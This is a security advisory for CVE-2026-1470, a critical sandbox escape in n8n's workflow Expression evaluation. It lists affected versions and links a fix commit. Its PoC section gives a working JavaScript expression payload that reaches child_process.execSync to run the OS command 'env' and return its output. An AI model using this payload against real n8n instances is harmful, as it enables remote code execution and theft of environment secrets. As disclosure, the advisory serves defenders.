---
description: CVE-2026-1470, CRITICAL, n8n users can achieve arbitrary code execution on the n8n host by adding an Expression Node
title: n8n Expression Node RCE
date_published: "2026-01-27"
last_updated: "2026-01-27"
xray_id: JFSA-2026-001651697
vul_id: CVE-2026-1470
cvss: 9.9
severity: critical
discovered_by: Natan Nehorai
type: vulnerability

---

## Summary

Authenticated users can bypass the Expression sandbox mechanism to achieve full remote code execution on n8n’s main node.

## Component

n8n

## Affected versions

(,1.123.17)

[2.0.0,2.4.5)

[2.5.0,2.5.1)

## Description

n8n contains a critical Remote Code Execution (RCE) vulnerability in its workflow Expression evaluation system. Expressions supplied by authenticated users during workflow configuration may be evaluated in an execution context that is not sufficiently isolated from the underlying runtime.

An authenticated attacker could abuse this behavior to execute arbitrary code with the privileges of the n8n process. Successful exploitation may lead to full compromise of the affected instance, including unauthorized access to sensitive data, modification of workflows, and execution of system-level operations.

## PoC

1. Go to the n8n instance and create a new workflow

2. Choose the "Edit Fields" block and double click on it

3.  Write the following payload in the field name or value -

   ```js
   {{ (function(){ var constructor = 123; with(function(){}){ return constructor("return process.mainModule.require('child_process').execSync('env').toString().trim()")() } })() }}
   ```

4. Press "Execute step" and observe that the returned JSON object contains the `env` OS command's output



## Vulnerability Mitigations

No mitigations are supplied for this issue



## References

[Fix commit](https://github.com/n8n-io/n8n/commit/aa4d1e5825829182afa0ad5b81f602638f55fa04)

